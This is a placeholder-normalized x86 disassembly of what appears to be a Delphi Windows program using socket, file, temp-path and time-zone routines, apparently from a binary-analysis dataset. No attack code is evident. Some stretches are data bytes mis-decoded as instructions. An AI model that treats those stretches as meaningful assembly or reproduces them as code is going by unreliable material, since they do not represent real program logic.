push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46d075
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d07c
lea eax [ ebp - 0xc ]
call sub_404164
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4188a0
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_46d084
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402d24
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402d24
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402d24
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46cfe0
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46cfe0
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46cfe0
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46cfa4
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46cfa4
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46cfa4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46d19c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_46d1b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402d24
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_46c920
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46d224
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_46d244
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0xc ] eax
sub_46d2a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46d371
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_40395c#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40848c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d378
lea eax [ ebp - 0x10 ]
call sub_404164
retn
sub_46d397
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_46d4a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40544c
xor eax eax
push ebp
push j_sub_403830#2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_40435c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_405488
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4a8
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40544c
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_40435c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_46d46b
mov eax [ ebp - 0x4 ]
call sub_403368
call sub_403b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4a8
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40544c
retn
sub_46d4cc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_46d566
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_46c21c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d56d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404188
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_46d574
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46d590
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_46d646
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46d629
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d630
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_46d658
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_46d71b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
mov eax [ ebp - 0x8 ]
call sub_40848c
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
mov eax [ ebp - 0xc ]
call sub_40848c
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
mov eax [ ebp - 0x10 ]
call sub_40848c
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
mov eax [ ebp - 0x14 ]
call sub_40848c
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d722
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404188
retn
sub_46d740
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d7ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46c21c
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_4041b8
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d7d5
lea eax [ ebp - 0x18 ]
call sub_404164
retn
sub_46d7e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d86e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46c21c
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_4041b8
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d875
lea eax [ ebp - 0x18 ]
call sub_404164
retn
sub_46d880
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_46d8a0
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_46d8fa
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d901
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_46d908
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_46d962
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d969
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_46d970
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_46d9a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46da45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_46c3e0
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da4c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_409098
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4041b8
sub_46da54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46da8d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da94
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_46dac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46dae9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46daf0
retn
sub_46dbd7
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add ah ah
fild [ esi ]
add edx [ eax ]
push esp
dec ecx
dec ebp
popad
js r-xdata
add al [ eax ]
add [ eax ] al
and ah bl
inc esi
add [ 0x534f7372 ] cl
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ah
fild [ esi ]
or ebp [ ebp + 0x61 ]
inc ebp
js r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ edi ] bl
inc ebp
dec ecx
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x65526f54
je r-xdata
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
retn
imul esi [ gs : esi + 0x65 ] 0x656d6954
pop es
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xdc
inc esi
add [ eax + eax ] cl
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
pop edx
inc esi
popad
insb
jae r-xdata
imul esi [ esi + 0x65 ] 0x656d6954
push esp
jb r-xdata
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 8 + 0xc0046 ] dh
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
bound esp [ ecx + 0x6c ]
and al 0xdc
inc esi
add [ ebx ] al
push cs
push esp
dec ecx
push edx
jne r-xdata
jb r-xdata
or [ ecx + 0x64 ] cl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
nop
mov ah 0xdc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
dec ecx
outsb
outsw
fcomp st4
inc esi
add [ ecx ] dl
add ch [ esi ]
cmp [ eax + eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] dl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
cld
fadd [ esi ]
adc [ ebx ] eax
xor [ cs : ecx ] dh
add al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] dl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
mov eax eax
insd
pop edx
jb r-xdata
pop es
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
lodsb [ esi ]
xor eax 0x35a00040
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
[ esi + 0x5b ]
retn
inc esp
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] ah
fadd [ esi ]
or eax 0x534f7372
add [ eax ] al
add [ eax ] al
sub_46de1c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46de7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_4047b0
mov eax [ ebx ]
call sub_404624
push eax
mov eax [ ebx ]
call sub_404424
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_4047b0
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_46dd1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de82
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_46de88
push ebp
mov ebp esp
add esp 0xffffff44
push ebx
push esi
xor eax eax
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] eax
xor eax eax
push ebp
push sub_46df9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xb4 ]
push eax
call GetTimeZoneInformation
sub eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xb8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xb8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
dec eax
je r-xdata
push 0x0
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax ecx
mov esi 0x3c
cdq
idiv esi
push edx
mov eax ebx
cdq
xor eax edx
sub eax edx
mov eax ecx
mov ecx 0x3c
cdq
idiv ecx
xor ecx ecx
pop edx
call sub_409968
fstp [ ebp - 0x8 ]
fwait
test ebx ebx
jle r-xdata
mov ebx [ ebp - 0xb4 ]
jmp r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dfa2
lea eax [ ebp - 0xbc ]
mov edx 0x2
call sub_404188
retn
fld [ r-xdata ]
fsub [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov ebx [ ebp - 0xb4 ]
add ebx [ ebp - 0x60 ]
jmp r-xdata
dec eax
je r-xdata
mov ebx [ ebp - 0xb4 ]
add ebx [ ebp - 0xc ]
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0xbc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xbc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_46dfb0
push ebp
mov ebp esp
add esp 0xffffff44
xor eax eax
mov [ ebp - 0xbc ] eax
xor eax eax
push ebp
push sub_46e074
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xb4 ]
push eax
call GetTimeZoneInformation
sub eax 0x1
jb r-xdata
fild [ ebp - 0xb4 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
je r-xdata
fld [ ebp - 0x8 ]
fdiv [ r-xdata ]
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e07b
lea eax [ ebp - 0xbc ]
call sub_404164
retn
mov eax [ ebp - 0xb4 ]
add eax [ ebp - 0x60 ]
mov [ ebp - 0xb8 ] eax
fild [ ebp - 0xb8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
dec eax
jne r-xdata
call GetLastError
lea edx [ ebp - 0xbc ]
call sub_40b334
mov ecx [ ebp - 0xbc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ ebp - 0xb4 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0xb8 ] eax
fild [ ebp - 0xb8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_46e088
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e151
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_404570
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_408068
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408068
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_404768
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404684
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_4041b8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e158
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404188
retn
push ebx
mov eax edi
call sub_404424
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404684
mov eax ebx
call sub_404164
jmp r-xdata
sub_46e170
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_46e088
mov eax esi
mov edx r-xdata
call sub_404570
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_404768
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404684
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_4041b8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404424
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404684
jmp r-xdata
mov eax ebx
call sub_404164
jmp r-xdata
sub_46e220
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
test ebx ebx
js r-xdata
mov edx esp
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404d40
xor eax eax
push ebp
push sub_46e2ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0xc ]
test esi esi
jl r-xdata
mov esi [ edx + ebx * 4 ]
dec ebx
push esi
jns r-xdata
or edi 0xffffffff
inc esi
xor edi edi
mov ebx [ ebp - 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
call sub_408218
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404570
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e2c1
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
inc ecx
mov edx [ r-xdata ]
call sub_404c00
retn
inc edi
add ebx 0x4
dec esi
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_46e310
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_404424
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_408110
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_46e3a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_404424
mov edi eax
mov eax [ esp ]
call sub_404424
mov esi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp esi edi
jge r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
